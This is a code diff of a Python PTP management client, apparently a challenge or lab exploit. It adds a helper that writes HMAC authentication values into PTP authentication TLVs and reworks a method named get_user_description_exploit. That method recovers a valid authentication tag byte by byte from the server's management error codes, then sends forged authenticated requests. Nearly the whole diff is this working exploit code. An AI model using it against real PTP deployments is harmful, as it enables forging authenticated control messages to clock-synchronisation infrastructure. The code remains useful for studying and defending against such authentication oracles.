@@ -67,6 +67,21 @@ class PtpManagement:
         tlv.payload.authentication.key_id = 0
         tlv.payload.authentication.icv_length = 16
 
+    def finalize_auth_tlvs(self, request, secret="", icv=None):
+        message = ptp_message.from_buffer(request)
+        buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))
+
+        for tlv in message.get_tlvs():
+            if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
+                continue
+
+            icv_address = tlv.payload.authentication.icv
+
+            if icv == None:
+                icv = hmac.new(secret, bytearray(request)[:icv_address-buffer_address], hashlib.sha256).digest()
+
+            ptp_protocol.ffi.memmove(icv_address, icv[:16], 16)
+
     def claim_port(self, secret, description):
         secret = secret.encode('utf-8')
         if (len(secret) > 100):
@@ -112,11 +127,10 @@ class PtpManagement:
 
         self.add_auth_tlv(message)
 
-        request = bytearray(message.encode(self.BUFFER_SIZE))
-        icv = hmac.new(secret, request[:-16], hashlib.sha256).digest()
-        request[-16:] = icv[:16]
-        self.send_raw(request)
+        request = message.encode(self.BUFFER_SIZE)
+        self.finalize_auth_tlvs(request, secret=secret)
 
+        self.send_raw(request)
         response = self.receive()
 
     def get_user_description_exploit(self):
@@ -136,10 +150,11 @@ class PtpManagement:
         tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION
 
         self.add_auth_tlv(message)
-        request = bytearray(message.encode(self.BUFFER_SIZE))
+        request = message.encode(self.BUFFER_SIZE)
 
         for i in range(len(icv) + 1):
-            request[-len(icv):] = icv
+            self.finalize_auth_tlvs(request, icv=icv)
+            #request[-len(icv):] = icv
 
             self.send_raw(request)
             response = self.receive()
@@ -152,7 +167,7 @@ class PtpManagement:
                     icv[i] = tlv.payload.management_error_status.error_id - 0xc000
 
 def main():
-    with PtpManagement(42, 1337) as management:
+    with PtpManagement(42, 2001) as management:
         print("Claim port")
         management.claim_port("password", "my port")
         print()
